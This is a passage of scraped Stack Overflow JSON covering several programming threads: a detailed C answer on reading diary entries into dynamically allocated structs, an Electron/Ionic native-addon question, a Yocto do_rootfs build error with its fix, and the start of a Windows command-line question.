<code>&#47;W3</code> with VS (you can use <code>&#47;Wall</code> -- but your will get non-code warnings then)"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525161581, "post_id": 50111174, "comment_id": 87243368, "body": "i am using Windows, but i am not using <code>size_t</code> but i am using <code>int</code>, hence i am not using <code>%zu</code> but <code>%d</code>, i dont see that as a problem. My compiler compiles well without any warning with <code>&#47;Wall</code> but it still crashed."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525204315, "post_id": 50111174, "comment_id": 87263795, "body": "What do you have in your data file? The code validates every step it takes and gives a descriptive error any where it fails. If it is still exits on <code>error failed to parse date 0</code>, then you have a data file problem. I have compiled the code given both on Linux and Windows and it runs without a problem. Are you are mixing <code>size_t</code> and <code>int</code> in any of the comparisons? Edit your question and ADD (at the end), the code you currently say fails -- and I&#39;ll tell you why it is failing."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525204435, "post_id": 50111174, "comment_id": 87263854, "body": "From your comment above <code>... fprintf (stderr, &quot;error: failed to read entry %zu.\\n&quot;, i);</code> you still have <code>%zu</code> format specifiers in the code. I thought you said you were not using them?"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525335419, "post_id": 50111174, "comment_id": 87318013, "body": "I have solved the problem but i having segmentation fault when i run it in Unix. Refer my code here: <a href=\"https://stackoverflow.com/questions/50150137/i-get-segmentation-fault-core-dumped-when-i-tried-to-run-program-with-struct\" title=\"i get segmentation fault core dumped when i tried to run program with struct\">stackoverflow.com/questions/50150137/&hellip;</a>"}], "tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 0, "last_activity_date": 1525211765, "last_edit_date": 1525211765, "creation_date": 1525147179, "answer_id": 50111174, "question_id": 50015872, "link": "https://stackoverflow.com/questions/50015872/how-to-get-alternative-line-from-a-file-and-store-it-as-string-into-a-struct/50111174#50111174", "title": "How to get alternative line from a file and store it as string into a struct?", "body": "<p>Your problem presents the classic problem of \"How do I read and allocate for X number of something when I don't know how many beforehand?\" This is actually a simpler variant of the question, because you can read the <code>X</code> number as the first line from your data file. </p>\n\n<p>(which simplifies the problem to a single allocation of X structs after reading the first line - otherwise you would need to keep track of the current number of structs allocated and <code>realloc</code> as required)</p>\n\n<p>To begin, I would recommend against creating <code>char entry[1024];</code> within your struct for two reasons - first, the automatic storage for <code>entry</code> is created on the stack and a large diary could easily StackOverflow... Second, it's just wasteful. If the goal is dynamic allocation, then allocate only the storage necessary for each <code>entry</code>. You can declare a single buffer of <code>1024</code> chars to use as a read buffer, but then allocate only <code>strlen (buf) + 1</code> char to hold the entry (after trimming the included <code>'\\n'</code> from the entry).</p>\n\n<p>The remainder of your problem, is the basis for any reliable code, is simply to <strong>validate</strong> each read, each parse, and each allocation so you insure you are processing valid data and have valid storage throughout your code. This applies to every pieces of code you write, not just this problem.</p>\n\n<p>Putting those pieces together, and providing further details inline in the comments below, you could do something like the following:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct journal {\n    int day,\n        month,\n        year;\n    char *entry;    /* declare a pointer, allocate only need No. of chars */\n} diary_t;\n\n#define MAXLENGTH 1024  /* max read buf for diary entry */\n\nint main (int argc, char **argv) {\n\n    size_t entries = 0, i, n = 0;\n    char buf[MAXLENGTH] = \"\";\n    diary_t *diary = NULL;\n    FILE *fp = argc &gt; 1 ? fopen (argv[1], \"r\") : stdin;\n\n    if (!fp) {  /* validate file open for reading */\n        fprintf (stderr, \"error: file open failed '%s'.\\n\", argv[1]);\n        return 1;\n    }\n\n    /* read first line, parse number of entries */\n    if (!(fgets (buf, MAXLENGTH, fp)) ||        /* validate read */\n        sscanf (buf, \"%zu\", &amp;entries) != 1) {   /* validate conversion */\n        fputs (\"error: failed to read 1st line.\\n\", stderr);\n        return 1;\n    }\n\n    /* allocate/validate entries number of diary_t */\n    if (!(diary = calloc (entries, sizeof *diary))) {\n        perror (\"calloc-diary_pointers\");\n        return 1;\n    }\n\n    for (i = 0; i &lt; entries; i++) { /* loop No. entries times */\n\n        size_t len = 0;\n        if (!fgets (buf, MAXLENGTH, fp)) {  /* read/validate date */\n            fprintf (stderr, \"error: failed to read date %zu.\\n\", i);\n            return 1;\n        }\n        if (sscanf (buf, \"%d/%d/%d\",    /* parse into day, month, year */\n                    &amp;diary[i].day, &amp;diary[i].month, &amp;diary[i].year) != 3) {\n            fprintf (stderr, \"error failed to parse date %zu.\\n\", i);\n            return 1;\n        }\n\n        if (!fgets (buf, MAXLENGTH, fp)) {  /* read entry */\n            fprintf (stderr, \"error: failed to read entry %zu.\\n\", i);\n            return 1;\n        }\n\n        len = strlen (buf);                 /* get length */\n        if (len &amp;&amp; buf[len - 1] == '\\n')    /* check last char is '\\n' */\n            buf[--len] = 0;                 /* overwrite with nul-character */\n        else if (len == MAXLENGTH - 1) {    /* check entry too long */\n            fprintf (stderr, \"error: entry %zu exceeds MAXLENGTH.\\n\", i);\n            return 1;\n        }\n\n        /* allocate/validate memory for entry */\n        if (!(diary[i].entry = malloc ((len + 1)))) {\n            perror (\"malloc-diary_entry\");\n            fprintf (stderr, \"error: memory exausted, entry[%zu].\\n\", i);\n            break;  /* out of memory error, don't exit, just break */\n        }\n        strcpy (diary[i].entry, buf);   /* copy buf to entry */\n\n        n++;    /* increment successful entry read */\n    }\n    if (fp != stdin) fclose (fp);   /* close file if not stdin */\n\n    for (i = 0; i &lt; n; i++) {   /* output diary entries */\n        printf (\"entry[%2zu]:  %2d/%2d/%4d - %s\\n\", i, diary[i].day,\n                diary[i].month, diary[i].year, diary[i].entry);\n        free (diary[i].entry);  /* don't forget to free entries */\n    }\n    free (diary);   /* don't forget to free diary */\n\n    return 0;\n}\n</code></pre>\n\n<p>(<strong>note:</strong> you can further simplify the code by using POSIX <code>getline()</code> for your read instead of a fixed <code>buf</code> and you can simplify the allocation and copy of each entry into your struct using <code>strdup()</code>, but neither are guaranteed available to all compilers -- use them if your compiler supports them and portability everywhere isn't a concern. Also note the GNU gcc uses <code>%zu</code> as the format specifier for <code>size_t</code>. If you are on windoze, change each to <code>%lu</code>)</p>\n\n<p><strong>Example Input File</strong></p>\n\n<pre><code>$ cat dat/diary.txt\n4\n12/04/2010\nInterview went well I think, though was told to wear shoes.\n18/04/2010\nDoc advised me to concentrate on something... I forget.\n03/05/2010\nWas asked today if I was an art exhibit.\n19/05/2010\nApparently mudcakes not made of mud, or angry wasps.\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/diary &lt;dat/diary.txt\nentry[ 0]:  12/ 4/2010 - Interview went well I think, though was told to wear shoes.\nentry[ 1]:  18/ 4/2010 - Doc advised me to concentrate on something... I forget.\nentry[ 2]:   3/ 5/2010 - Was asked today if I was an art exhibit.\nentry[ 3]:  19/ 5/2010 - Apparently mudcakes not made of mud, or angry wasps.\n</code></pre>\n\n<p><strong>Memory Use/Error Check</strong></p>\n\n<p>In any code you write that dynamically allocates memory, you have 2 <em>responsibilities</em> regarding any block of memory allocated: (1) <em>always preserve a pointer to the starting address</em> for the block of memory so, (2) it can be <em>freed</em> when it is no longer needed.</p>\n\n<p>It is imperative that you use a memory error checking program to insure you do not attempt to access memory or write beyond/outside the bounds of your allocated block, attempt to read or base a conditional jump on an uninitialized value, and finally, to confirm that you free all the memory you have allocated. </p>\n\n<p>For Linux <code>valgrind</code> is the normal choice. There are similar memory checkers for every platform. They are all simple to use, just run your program through it.</p>\n\n<pre><code>$ valgrind ./bin/diary &lt;dat/diary.txt\n==6403== Memcheck, a memory error detector\n==6403== Copyright (C) 2002-2015, and GNU GPL'd, by Julian Seward et al.\n==6403== Using Valgrind-3.12.0 and LibVEX; rerun with -h for copyright info\n==6403== Command: ./bin/diary\n==6403==\nentry[ 0]:  12/ 4/2010 - Interview went well I think, though was told to wear shoes.\nentry[ 1]:  18/ 4/2010 - Doc advised me to concentrate on something... I forget.\nentry[ 2]:   3/ 5/2010 - Was asked today if I was an art exhibit.\nentry[ 3]:  19/ 5/2010 - Apparently mudcakes not made of mud, or angry wasps.\n==6403==\n==6403== HEAP SUMMARY:\n==6403==     in use at exit: 0 bytes in 0 blocks\n==6403==   total heap usage: 5 allocs, 5 frees, 309 bytes allocated\n==6403==\n==6403== All heap blocks were freed -- no leaks are possible\n==6403==\n==6403== For counts of detected and suppressed errors, rerun with: -v\n==6403== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 0 from 0)\n</code></pre>\n\n<p>(<strong>note:</strong> the storage required for all diary entries (the entire diary) is only <code>309-bytes</code> that is less than <code>1/10th</code> the storage required declaring <code>char entry[1024];</code>) </p>\n\n<p>Always confirm that you have freed all memory you have allocated and that there are no memory errors.</p>\n\n<hr>\n\n<p><strong>MS Windows</strong></p>\n\n<p>Since you seem to be having problems on windows, the following is the code above, with nothing but <code>%lu</code> substituted for <code>%zu</code> (as windows treats <code>%zu</code> as a literal), compiled on Win7 with an older version of VS compiler:</p>\n\n<pre><code>&gt; cl /?\nMicrosoft (R) 32-bit C/C++ Optimizing Compiler Version 16.00.30319.01 for 80x86\nCopyright (C) Microsoft Corporation.  All rights reserved.\n</code></pre>\n\n<p><strong>Compile</strong></p>\n\n<pre><code>&gt; cl /nologo /Wall /wd4706 /wd4996 /Ox /Foobj/diary /Febin/diary /Tc diary.c\n</code></pre>\n\n<p>(<strong>note:</strong> I put my .obj files in a subdirectory <code>./obj</code> and my binary executables in <code>./bin</code> to keep my source directory clean. That is the purpose of <code>/Foobj/diary</code> and <code>/Febin/diary</code> above)</p>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>&gt; bin\\diary.exe dat\\diary.txt\nentry[ 0]:  12/ 4/2010 - Interview went well I think, though was told to wear shoes.\nentry[ 1]:  18/ 4/2010 - Doc advised me to concentrate on something... I forget.\nentry[ 2]:   3/ 5/2010 - Was asked today if I was an art exhibit.\nentry[ 3]:  19/ 5/2010 - Apparently mudcakes not made of mud, or angry wasps.\n</code></pre>\n\n<p>You must insure you change, each and every <code>%zu</code> to <code>%lu</code> or you cannot expect proper output. You say you have changed all to <code>int</code>, but the snippet you posted in the comments below contains <code>%zu</code> -- this will not work on windows.</p>\n\n<p>Look things over and let me know if you have further questions.</p>\n"}], "owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 116, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1525211765, "creation_date": 1524639391, "last_edit_date": 1525141066, "question_id": 50015872, "link": "https://stackoverflow.com/questions/50015872/how-to-get-alternative-line-from-a-file-and-store-it-as-string-into-a-struct", "title": "How to get alternative line from a file and store it as string into a struct?", "body": "<p>i have a file needed to be read by code. The file is shown as below. The very \ufb01rst line of the \ufb01le contains a single integer, indicating the number of journal entries in the \ufb01le. I need to write a C program to read a \ufb01le and store the contents in a dynamically-allocated array of structs. </p>\n\n<pre><code>4\n12/04/2010 \nInterview went well I think, though was told to wear shoes. \n18/04/2010 \nDoc advised me to concentrate on something... I forget. \n03/05/2010\nWas asked today if I was an art exhibit. \n19/05/2010 \nApparently mudcakes not made of mud, or angry wasps.\n</code></pre>\n\n<p>I was able to strtok() the day, month and year to store in my struct, however I am stuck in saving the strings to my structs.\nHere is my code for strtok(),</p>\n\n<pre><code>FILE* file=fopen(\"struct.txt\",\"r\");\n        if (file==NULL){\n            perror(\"Error opening file\\n.\");}\n            else {\n                fscanf(file,\"%d\",&amp;size);\n                 res=(Diary*)malloc(size*sizeof(Diary));\n                 fscanf(file,\"%*[^\\n]\");\nwhile(fgets(day,1024,file)!= NULL){\n    oken=strtok(day,\"/\");\n    h[i]=atoi(oken);          */h[i] is my day\n    oken=strtok(NULL,\"/\");\n    fre[i]=atoi(oken);        */fre[i] is the month\n    oken=strtok(NULL,\"/\");\n    re[i]=atoi(oken);          */ re[i] is the year\n    okena=strtok(day,\"\\n\");\n    strcpy(rese[i],okena);    */i had declared rese as char rese[1024]\n    printf(\"%s\",okena);\n    i++;\n   }\n</code></pre>\n\n<p>the program is not working with that strcpy(), when i run it, it keep crashing. However if i remove the strcpy(), it will print as follow:</p>\n\n<pre><code>12\nInterview went well I think, though was told to wear shoes. \n18\nDoc advised me to concentrate on something... I forget. \n03\nWas asked today if I was an art exhibit. \n19\nApparently mudcakes not made of mud, or angry wasps.\n</code></pre>\n\n<p>which this is not the strings i want to store in my struct as well. I am stuck in how to store the strings into a struct. My struct is </p>\n\n<pre><code>typedef struct journal{\nint day;\nint month;\nint year;\nchar entry[1024];\n} Diary;\n</code></pre>\n\n<p>Any good souls could tell me what is wrong?</p>\n"}, {"tags": ["c", "node.js", "cordova", "ionic-framework", "electron"], "owner": {"reputation": 31, "user_id": 4232461, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-Vi2Uujkr0zo/AAAAAAAAAAI/AAAAAAAAAAA/CFQgqR3P4bk/photo.jpg?sz=128", "display_name": "Minji Wei", "link": "https://stackoverflow.com/users/4232461/minji-wei"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 54, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1524639198, "creation_date": 1524639198, "question_id": 50015821, "link": "https://stackoverflow.com/questions/50015821/share-the-uis-between-electron-desktop-with-ionic-app", "title": "Share the UIs between electron desktop with ionic app", "body": "<p>I have a Android app write with ionic, and it will call some C functions with Cordova. </p>\n\n<p>Now, I need to make the same app to the Desktop. I want to use Electron. and the C code can run as nodejs C/C++ addon in electron. but if i use the ionic in electron. I will got following error when load the nodejs addon:</p>\n\n<p><strong>Module parse failed: XXX.node Unexpected character''(1:0) You may need an appropriate loader to handle this file type (Source code omitted for this binary file)</strong></p>\n\n<p>The XXX.node is the C library binary file.</p>\n\n<p>I google some days, and found someone said that Node runs on the server side. Ionic is client side, so ionic can't call the node modules. Is that right? </p>\n\n<p>If that is right, How can i use the same UIs code? I need to rewrite one or use other framework? </p>\n\n<p>Thanks!</p>\n"}, {"tags": ["c", "linux", "ubuntu-16.04", "embedded-linux", "yocto"], "comments": [{"owner": {"reputation": 1586, "user_id": 6225741, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e7f147a4cf533863ff2f12762e3c6192?s=128&d=identicon&r=PG", "display_name": "Nayfe", "link": "https://stackoverflow.com/users/6225741/nayfe"}, "edited": false, "score": 0, "creation_date": 1524640792, "post_id": 50015694, "comment_id": 87048647, "body": "<code>createrepo_c</code> tool fails with <code>core-image-sato&#47;1.0-r0&#47;oe-rootfs-repo&#47;.repodata&#47; already exists! (Another createrepo process is running?)</code>. Do you have any qemu instance already running? Try to remove that <code>.repodata</code> folder and build again?"}, {"owner": {"reputation": 199, "user_id": 6749197, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c9b5634e9bde131e3f0e6de6cac5a65?s=128&d=identicon&r=PG&f=1", "display_name": "Rahul Gusai", "link": "https://stackoverflow.com/users/6749197/rahul-gusai"}, "reply_to_user": {"reputation": 1586, "user_id": 6225741, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e7f147a4cf533863ff2f12762e3c6192?s=128&d=identicon&r=PG", "display_name": "Nayfe", "link": "https://stackoverflow.com/users/6225741/nayfe"}, "edited": false, "score": 0, "creation_date": 1524643828, "post_id": 50015694, "comment_id": 87050455, "body": "There was one just rpm directory in the given path and nothing as .repodata folder.I removed that directory but still it comes up with same error."}, {"owner": {"reputation": 1586, "user_id": 6225741, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e7f147a4cf533863ff2f12762e3c6192?s=128&d=identicon&r=PG", "display_name": "Nayfe", "link": "https://stackoverflow.com/users/6225741/nayfe"}, "edited": false, "score": 0, "creation_date": 1524644369, "post_id": 50015694, "comment_id": 87050767, "body": "What is your Yocto version?"}, {"owner": {"reputation": 1586, "user_id": 6225741, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e7f147a4cf533863ff2f12762e3c6192?s=128&d=identicon&r=PG", "display_name": "Nayfe", "link": "https://stackoverflow.com/users/6225741/nayfe"}, "edited": false, "score": 0, "creation_date": 1524815255, "post_id": 50015694, "comment_id": 87131876, "body": "Maybe ask this question on <a href=\"https://lists.yoctoproject.org/listinfo/poky\" rel=\"nofollow noreferrer\">mailing-list</a> or irc <a href=\"https://webchat.freenode.net/\" rel=\"nofollow noreferrer\">#yocto</a>"}], "answers": [{"tags": [], "owner": {"reputation": 71, "user_id": 9931358, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c93b186c79e56ba6729ae6d90b1548f9?s=128&d=identicon&r=PG", "display_name": "jmiranda", "link": "https://stackoverflow.com/users/9931358/jmiranda"}, "is_accepted": false, "score": 4, "last_activity_date": 1528820522, "creation_date": 1528820522, "answer_id": 50821791, "question_id": 50015694, "link": "https://stackoverflow.com/questions/50015694/do-rootfs-function-failed-in-yocto-project/50821791#50821791", "title": "do_rootfs function failed in yocto project", "body": "<p>I got the same error when my host machine shut down abruptly, but everything worked well after I delete the <code>.repodata</code> folder with <code>sudo rm -r build/tmp/work/qemux86-poky-linux/core-image-sato/1.0-r0/oe-rootfs-repo/.repodata/</code> and then build again.</p>\n"}, {"tags": [], "owner": {"reputation": 61, "user_id": 6751172, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a3e9556e8c013c12a271938559f6d4fb?s=128&d=identicon&r=PG&f=1", "display_name": "Bernhard", "link": "https://stackoverflow.com/users/6751172/bernhard"}, "is_accepted": false, "score": 1, "last_activity_date": 1567655295, "creation_date": 1567655295, "answer_id": 57798164, "question_id": 50015694, "link": "https://stackoverflow.com/questions/50015694/do-rootfs-function-failed-in-yocto-project/57798164#57798164", "title": "do_rootfs function failed in yocto project", "body": "<p>I stopped a build using Ctrl-C and got the python error described in the original question.</p>\n\n<p>The .repodata folder (please see the answer from jmiranda) was empty. So I deleted the oe-rootfs-repo folder and this worked for me. </p>\n"}], "owner": {"reputation": 199, "user_id": 6749197, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c9b5634e9bde131e3f0e6de6cac5a65?s=128&d=identicon&r=PG&f=1", "display_name": "Rahul Gusai", "link": "https://stackoverflow.com/users/6749197/rahul-gusai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3085, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1567655295, "creation_date": 1524638748, "last_edit_date": 1524639168, "question_id": 50015694, "link": "https://stackoverflow.com/questions/50015694/do-rootfs-function-failed-in-yocto-project", "title": "do_rootfs function failed in yocto project", "body": "<p>I am just getting started with the yocto project and trying to build an image for x86 architecture to be emulated using QEMU emulator (running on Ubuntu 16.04 ).I am getting the following error while building the OS image.</p>\n\n<pre><code>ERROR: core-image-sato-1.0-r0 do_rootfs: Error executing a python function in exec_python_func() autogenerated:\n\nThe stack trace of python calls that resulted in this exception/failure was:\nFile: 'exec_python_func() autogenerated', lineno: 2, function: &lt;module&gt;\n     0001:\n *** 0002:do_rootfs(d)\n     0003:\nFile: '/home/rahul/poky/poky/meta/classes/image.bbclass', lineno: 258, function: do_rootfs\n     0254:    progress_reporter.next_stage()\n     0255:\n     0256:    # generate rootfs\n     0257:    d.setVarFlag('REPRODUCIBLE_TIMESTAMP_ROOTFS', 'export', '1')\n *** 0258:    create_rootfs(d, progress_reporter=progress_reporter, logcatcher=logcatcher)\n     0259:\n     0260:    progress_reporter.finish()\n     0261:}\n     0262:do_rootfs[dirs] = \"${TOPDIR}\"\nFile: '/home/rahul/poky/poky/meta/lib/oe/rootfs.py', lineno: 1010, function: create_rootfs\n     1006:    env_bkp = os.environ.copy()\n     1007:\n     1008:    img_type = d.getVar('IMAGE_PKGTYPE')\n     1009:    if img_type == \"rpm\":\n *** 1010:        RpmRootfs(d, manifest_dir, progress_reporter, logcatcher).create()\n     1011:    elif img_type == \"ipk\":\n     1012:        OpkgRootfs(d, manifest_dir, progress_reporter, logcatcher).create()\n     1013:    elif img_type == \"deb\":\n     1014:        DpkgRootfs(d, manifest_dir, progress_reporter, logcatcher).create()\nFile: '/home/rahul/poky/poky/meta/lib/oe/rootfs.py', lineno: 201, function: create\n     0197:        if self.progress_reporter:\n     0198:            self.progress_reporter.next_stage()\n     0199:\n     0200:        # call the package manager dependent create method\n *** 0201:        self._create()\n     0202:\n     0203:        sysconfdir = self.image_rootfs + self.d.getVar('sysconfdir')\n     0204:        bb.utils.mkdirhier(sysconfdir)\n     0205:        with open(sysconfdir + \"/version\", \"w+\") as ver:\nFile: '/home/rahul/poky/poky/meta/lib/oe/rootfs.py', lineno: 450, function: _create\n     0446:        rpm_pre_process_cmds = self.d.getVar('RPM_PREPROCESS_COMMANDS')\n     0447:        rpm_post_process_cmds = self.d.getVar('RPM_POSTPROCESS_COMMANDS')\n     0448:\n     0449:        # update PM index files\n *** 0450:        self.pm.write_index()\n     0451:\n     0452:        execute_pre_post_process(self.d, rpm_pre_process_cmds)\n     0453:\n     0454:        if self.progress_reporter:\nFile: '/home/rahul/poky/poky/meta/lib/oe/package_manager.py', lineno: 543, function: write_index\n     0539:\n     0540:    def write_index(self):\n     0541:        lockfilename = self.d.getVar('DEPLOY_DIR_RPM') + \"/rpm.lock\"\n     0542:        lf = bb.utils.lockfile(lockfilename, False)\n *** 0543:        RpmIndexer(self.d, self.rpm_repo_dir).write_index()\n     0544:        bb.utils.unlockfile(lf)\n     0545:\n     0546:    def insert_feeds_uris(self, feed_uris, feed_base_paths, feed_archs):\n     0547:        from urllib.parse import urlparse\nFile: '/home/rahul/poky/poky/meta/lib/oe/package_manager.py', lineno: 105, function: write_index\n     0101:        else:\n     0102:            signer = None\n     0103:\n     0104:        createrepo_c = bb.utils.which(os.environ['PATH'], \"createrepo_c\")\n *** 0105:        result = create_index(\"%s --update -q %s\" % (createrepo_c, self.deploy_dir))\n     0106:        if result:\n     0107:            bb.fatal(result)\n     0108:\n     0109:        # Sign repomd\nFile: '/home/rahul/poky/poky/meta/lib/oe/package_manager.py', lineno: 21, function: create_index\n     0017:def create_index(arg):\n     0018:    index_cmd = arg\n     0019:\n     0020:    bb.note(\"Executing '%s' ...\" % index_cmd)\n *** 0021:    result = subprocess.check_output(index_cmd, stderr=subprocess.STDOUT, shell=True).decode(\"utf-8\")\n     0022:    if result:\n     0023:        bb.note(result)\n     0024:\n     0025:\"\"\"\nFile: '/usr/lib/python3.5/subprocess.py', lineno: 626, function: check_output\n     0622:        # empty string. That is maintained here for backwards compatibility.\n     0623:        kwargs['input'] = '' if kwargs.get('universal_newlines', False) else b''\n     0624:\n     0625:    return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,\n *** 0626:               **kwargs).stdout\n     0627:\n     0628:\n     0629:class CompletedProcess(object):\n     0630:    \"\"\"A process that has finished running.\nFile: '/usr/lib/python3.5/subprocess.py', lineno: 708, function: run\n     0704:            raise\n     0705:        retcode = process.poll()\n     0706:        if check and retcode:\n     0707:            raise CalledProcessError(retcode, process.args,\n *** 0708:                                     output=stdout, stderr=stderr)\n     0709:    return CompletedProcess(process.args, retcode, stdout, stderr)\n     0710:\n     0711:\n     0712:def list2cmdline(seq):\nException: subprocess.CalledProcessError: Command '/home/rahul/poky/poky/build/tmp/work/qemux86-poky-linux/core-image-sato/1.0-r0/recipe-sysroot-native/usr/bin/createrepo_c --update -q /home/rahul/poky/poky/build/tmp/work/qemux86-poky-linux/core-image-sato/1.0-r0/oe-rootfs-repo' returned non-zero exit status 1\n\nSubprocess output:\nTemporary repodata directory /home/rahul/poky/poky/build/tmp/work/qemux86-poky-linux/core-image-sato/1.0-r0/oe-rootfs-repo/.repodata/ already exists! (Another createrepo process is running?)\n\nERROR: core-image-sato-1.0-r0 do_rootfs: Function failed: do_rootfs\nERROR: Logfile of failure stored in: /home/rahul/poky/poky/build/tmp/work/qemux86-poky-linux/core-image-sato/1.0-r0/temp/log.do_rootfs.5019\nERROR: Task (/home/rahul/poky/poky/meta/recipes-sato/images/core-image-sato.bb:do_rootfs) failed with exit code '1'\n</code></pre>\n\n<p>Build process runs upto almost 90 percent after which this error comes up which terminates the process.What could be the issue ?</p>\n"}, {"tags": ["c", "winapi", "main"], "comments": [{"owner": {"reputation": 2505, "user_id": 3118401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c066b73af214d8e7cf6b52f6ef75314a?s=128&d=identicon&r=PG", "display_name": "marcolz", "link": "https://stackoverflow.com/users/3118401/marcolz"}, "edited": false, "score": 1, "creation_date": 1524638014, "post_id": 50015387, "comment_id": 87047183, "body": "The example functions you name use a shell to execute. Have a look at <code>execv()</code> and friends."}, {"owner": {"reputation": 4535, "user_id": 59081, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c17b54bbea172f608e552f9bf67d4f9?s=128&d=identicon&r=PG", "display_name": "Tanveer Badar", "link": "https://stackoverflow.com/users/59081/tanveer-badar"}, "edited": false, "score": 0, "creation_date": 1524638021, "post_id": 50015387, "comment_id": 87047186, "body": "May as well ask why the sun rises in the east."}, {"owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 1, "creation_date": 1524642124, "post_id": 50015387, "comment_id": 87049398, "body": "<i>Why the parameters are not specified as array, too?</i> but why they must ? the command line as single string the most native option. and entry point of exe have <code>ULONG __stdcall ep(PEB*)</code> signature. <code>main</code> not a entry point"}, {"owner": {"reputation": 570607, "user_id": 505088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/3c0aac2191718ef0309dbc034d9b9961?s=128&d=identicon&r=PG", "display_name": "David Heffernan", "link": "https://stackoverflow.com/users/505088/david-heffernan"}, "edited": false, "score": 0, "creation_date": 1524652245, "post_id": 50015387, "comment_id": 87055810, "body": "You are comparing the C standard to the Windows API. These aren&#39;t comparable. The question is a bit of a non sequitur."}], "answers": [{"comments": [{"owner": {"reputation": 4142, "user_id": 2460378, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8195a4ad4c898abfd9544088d62901de?s=128&d=identicon&r=PG", "display_name": "Thomas S.", "link": "https://stackoverflow.com/users/2460378/thomas-s"}, "edited": false, "score": 0, "creation_date": 1524638843, "post_id": 50015466, "comment_id": 87047647, "body": "Are there convenience methods that split a command line string into its parts or escapes the parts to get a command line string?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 4142, "user_id": 2460378, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8195a4ad4c898abfd9544088d62901de?s=128&d=identicon&r=PG", "display_name": "Thomas S.", "link": "https://stackoverflow.com/users/2460378/thomas-s"}, "edited": false, "score": 1, "creation_date": 1524639079, "post_id": 50015466, "comment_id": 87047785, "body": "@ThomasS. See <a href=\"https://stackoverflow.com/q/12689142/440558\">Win32 API command line arguments parsing</a>."}, {"owner": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 